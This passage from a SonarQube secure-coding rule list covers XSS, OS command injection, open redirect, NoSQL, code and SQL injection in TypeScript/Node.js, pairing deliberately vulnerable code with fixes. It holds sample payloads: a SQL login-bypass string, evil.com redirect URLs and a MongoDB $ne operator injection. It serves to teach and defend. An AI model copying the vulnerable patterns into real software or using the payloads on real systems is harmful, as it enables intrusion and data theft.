this can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might
be possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous
vulnerabilities.</p>
<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could
find an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving
the attacker access to all user data stored in the web application.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to DOM-based cross-site scripting because it uses unsanitized URL parameters to alter the DOM of its webpage.</p>
<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s
browser through this example.</p>
<h4>Noncompliant code example</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML" rel="nofollow"><code>Element.innerHTML</code></a> property is used to replace the
contents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing
for code injection.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const rootEl &#61; document.getElementById(&#39;root&#39;);
const queryParams &#61; new URLSearchParams(document.location.search);
const input &#61; queryParams.get(&#34;input&#34;);

rootEl.innerHTML &#61; input; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText" rel="nofollow"><code>HTMLElement.innerText</code></a> property does not
create DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>
depending on the use case.</p>
<pre data-diff-id="1" data-diff-type="compliant">
const rootEl &#61; document.getElementById(&#39;root&#39;);
const queryParams &#61; new URLSearchParams(document.location.search);
const input &#61; queryParams.get(&#34;input&#34;);

rootEl.innerText &#61; input;
</pre>
<h3>How does this work?</h3>
<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,
as there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as
<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape
variables used in views, making it much harder to accidentally write vulnerable code.</p>
<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>
<h4>Sanitization of user-supplied data</h4>
<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data
intact from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context
where malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the
context. <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP’s DOM-based XSS Prevention Cheat
Sheet</a> goes into more detail about the required sanitization.</p>
<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href="https://github.com/cure53/DOMPurify" rel="nofollow">DOMPurify library</a>
offers extensive functionality to prevent XSS and has been tested by a large user base.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is
sometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the
filters of these firewalls.</p>
<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list
of sensitive HTML tags is very difficult in the long run.</p>
<h4>Modification after sanitization</h4>
<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the
effects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy</h4>
<p>With a defense-in-depth security approach, a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">Content Security Policy</a> (CSP) can
be added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS
attacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>
<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of
these domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="http://www.webappsec.org/projects/articles/071105.shtml" rel="nofollow">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind
  </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.sonarsource.com/blog/ghost-admin-takeover/" rel="nofollow">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2076">
              tssecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { execSync } &#61; require(&#39;child_process&#39;)

cmd &#61; req.query.cmd
execSync(cmd) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { spawnSync } &#61; require(&#39;child_process&#39;)

const cmdId &#61; parseInt(req.query.cmdId)
let host &#61; req.query.host
host &#61; typeof host &#61;&#61;&#61; &#34;string&#34;? host : &#34;example.org&#34;

const allowedCommands &#61; [
    {exe:&#34;/bin/ping&#34;, args:[&#34;-c&#34;,&#34;1&#34;,&#34;--&#34;]},
    {exe:&#34;/bin/host&#34;, args:[&#34;--&#34;]}
]
const cmd &#61; allowedCommands[cmdId]
spawnSync(cmd.exe, cmd.args.concat(host))
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a
full command name.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>child_process.spawn</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure
<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line
to run.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>
<h3>Pitfalls</h3>
<h4>Loose typing</h4>
<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that
can be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>
<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an
untrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an
arbitrary argument injection.</p>
<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>
<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any
unexpected issue.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6105">
              tssecurity:S6105
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com/redirect?url&#61;evil.com</code>, to redirect the victim to their evil domain.</p>
<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use
open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,
the attacker can perform various attacks, such as phishing.</p>
<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Phishing</h4>
<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect
vulnerability to lead the user to this malicious site.</p>
<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a
malicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s
account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of
the redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can
lead to a complete system compromise for the user.</p>
<h4>JavaScript injection (XSS)</h4>
<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the
trusted domain and has consequences such as the compromise of the user’s account.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<p>The following example is vulnerable to open redirection through the following URL:
<code>https://example.com/redirect?url&#61;https://evil.com</code>;</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const queryParams &#61; new URLSearchParams(document.location.search);
const redirectUrl &#61; queryParams.get(&#34;url&#34;);
document.location &#61; redirectUrl; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const queryParams &#61; new URLSearchParams(document.location.search);
const redirectUrl &#61; queryParams.get(&#34;url&#34;);

if (redirectUrl.startsWith(&#34;https://www.example.com/&#34;)) {
    document.location &#61; redirectUrl;
}
</pre>
<h3>How does this work?</h3>
<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred
as they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,
they might not solve the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li><li> Using an allowlist approach in case the destination URLs are multiple but limited. </li><li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual
  redirection. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of <code>String.startsWith</code> and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>
<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by
them.</p>
<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If
the prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the
broken validation.</p>
<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5147">
              tssecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br /> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br /> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li></ul>
<h2>How to fix it in MongoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted
from user inputs.</p>
<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or
dictionary input might tamper with the expected query behavior.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { MongoClient } &#61; require(&#39;mongodb&#39;);

function (req, res) {
    let query &#61; { user: req.query.user, city: req.query.city };

    MongoClient.connect(url, (err, db) &#61;&gt; {
        db.collection(&#34;users&#34;)
        .find(query) // Noncompliant
        .toArray((err, docs) &#61;&gt; { });
    });
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { MongoClient } &#61; require(&#39;mongodb&#39;);

function (req, res) {
    let query &#61; { user: req.query.user.toString(), city: req.query.city.toString() };

    MongoClient.connect(url, (err, db) &#61;&gt; {
        db.collection(&#34;users&#34;)
        .find(query)
        .toArray((err, docs) &#61;&gt; { });
    });
}
</pre>
<h3>How does this work?</h3>
<h4>Use only plain string values</h4>
<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using
the object <code>{ $ne: &#34;&#34; }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>
<p>Some JavaScript application servers enable &#34;extended&#34; syntax that serializes URL query parameters into JavaScript objects or arrays. This allows
attackers to control all the fields of an object. In express.js, this &#34;extended&#34; syntax <a href="https://expressjs.com/en/4x/api.html#express.urlencoded" rel="nofollow">is enabled by default</a>.</p>
<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>
<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the &#34;Pitfalls&#34; section)</p>
<h3>Pitfalls</h3>
<h4>Code execution</h4>
<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually
results in JavaScript code execution vulnerabilities.</p>
<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>
<p>For more information about MongoDB code execution vulnerabilities, see rule <a href="/organizations/sopra-steria/rules?open&#61;typescript%3AS5334&amp;rule_key&#61;typescript%3AS5334" rel="nofollow">S5334</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/" rel="nofollow">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/943" rel="nofollow">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5334">
              tssecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
function (req, res) {
    let operation &#61; req.query.operation
    eval(&#96;product_${operation}()&#96;) // Noncompliant
    res.send(&#34;OK&#34;)
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const allowed &#61; [&#34;add&#34;, &#34;remove&#34;, &#34;update&#34;]

let operationId &#61; req.query.operationId
const operation &#61; allowed[operationId]
eval(&#96;product_${operation}()&#96;)
res.send(&#34;OK&#34;)
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S3649">
              tssecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in Sequelize</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo&#39; OR 1&#61;1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
async function index(req, res) {
    const { db, User } &#61; req.app.get(&#39;sequelize&#39;);

    let loggedInUser &#61; await db.query(
        &#96;SELECT * FROM users WHERE user &#61; &#39;${req.query.user}&#39; AND pass &#61; &#39;${req.query.pass}&#39;&#96;,
        {
            model: User,
        }
    ); // Noncompliant

    res.send(JSON.stringify(loggedInUser));
    res.end();
}}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
async function index(req, res) {
    const { db, User, QueryTypes } &#61; req.app.get(&#39;sequelize&#39;);

    let user &#61; req.query.user;
    let pass &#61; req.query.pass;

    let loggedInUser &#61; await db.query(
        &#96;SELECT * FROM users WHERE user &#61; $user AND pass &#61; $pass&#96;,
        {
            bind: {
                user: user,
                pass: pass,
            },
            type: QueryTypes.SELECT,
            model: User,
        }
    );

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br /> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?
</pre>
